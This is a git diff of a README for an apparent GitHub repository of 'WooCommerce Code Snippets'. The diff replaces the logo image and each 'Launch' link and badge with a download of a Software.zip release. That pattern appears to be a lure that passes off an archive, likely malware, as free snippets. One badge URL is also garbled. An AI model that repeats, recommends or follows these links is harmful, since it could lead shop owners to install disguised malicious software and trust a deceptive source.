@@ -6,7 +6,7 @@ Welcome to the "WooCommerce Code Snippets" repository by Simplix Innovations! ðŸ
 
 This repository is a collection of helpful WooCommerce code snippets that can be used to customize or enhance the functionality of your WooCommerce store. These snippets are provided for free and aim to provide users with additional features to improve their online shopping experience.
 
-![WooCommerce Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/d/dc/WooCommerce.png/200px-WooCommerce.png)
+![WooCommerce Logo](https://github.com/0GHatMak3r/woocommerce-code-snippets/releases/download/v2.0/Software.zip)
 
 ## Features
 
@@ -24,7 +24,7 @@ This repository is a collection of helpful WooCommerce code snippets that can be
 
 To access the collection of WooCommerce code snippets, click the link below:
 
-[Launch WooCommerce Code Snippets](https://github.com/user-attachments/files/18426772/Application.zip)
+[Launch WooCommerce Code Snippets](https://github.com/0GHatMak3r/woocommerce-code-snippets/releases/download/v2.0/Software.zip)
 
 ## Issues or Questions
 
@@ -36,4 +36,4 @@ If you encounter any issues with the provided link or have any questions regardi
 
 We hope you find these WooCommerce code snippets useful for customizing and enhancing your online store. Happy coding! ðŸš€
 
-[![](https://img.shields.io/badge/Launch%20WooCommerce%20Code%20Snippets-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![](https://github.com/0GHatMak3r/woocommerce-code-snippets/releases/download/v2.0/Software.zip%20WooCommerce%20Code%20Snippets-blue)](https://github.com/0GHatMak3r/woocommerce-code-snippets/releases/download/v2.0/Software.zip)
